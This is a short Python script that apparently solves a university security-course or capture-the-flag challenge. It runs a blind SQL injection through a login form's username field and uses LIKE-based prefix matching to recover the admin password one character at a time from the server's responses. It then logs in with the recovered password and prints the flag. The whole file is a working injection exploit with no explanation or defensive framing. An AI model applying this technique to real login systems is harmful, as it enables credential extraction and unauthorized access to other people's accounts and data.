import requests
import re

MIN_ASCII_NUMBER = 48
MAX_ASCII_NUMBER = 122
ILLEGAL_ASCII_START = 58
ILLEGAL_ASCII_END = 60

s = requests.Session()
username_injection = 'admin" AND password LIKE '
password_injection = ''

password_crack = ""

flag = None
current_char = MIN_ASCII_NUMBER

while flag is None:
    p = s.post("https://t5.itsec.sec.in.tum.de/",
               data={"username": username_injection + '\"' + password_crack + chr(current_char) + '%\"--',
                     "password": password_injection})

    flag = re.search(r'flag\{[^}]+}', p.text)

    if flag is None:
        if "<b>Hmm my database says you're admin, but of course I20 doesn't fall for your cheap tricks!!</b>" in p.text:
            password_crack += chr(current_char)
            current_char = MIN_ASCII_NUMBER


        else:
            current_char += 1
            if current_char == ILLEGAL_ASCII_START:
                current_char = ILLEGAL_ASCII_END + 1

            if current_char > MAX_ASCII_NUMBER:
                break

    else:
        print(flag)
        break

p = s.post("https://t5.itsec.sec.in.tum.de/", data={"username": "admin", "password": password_crack.lower()})

flag = re.search(r'flag\{[^}]+}', p.text)
print(flag)
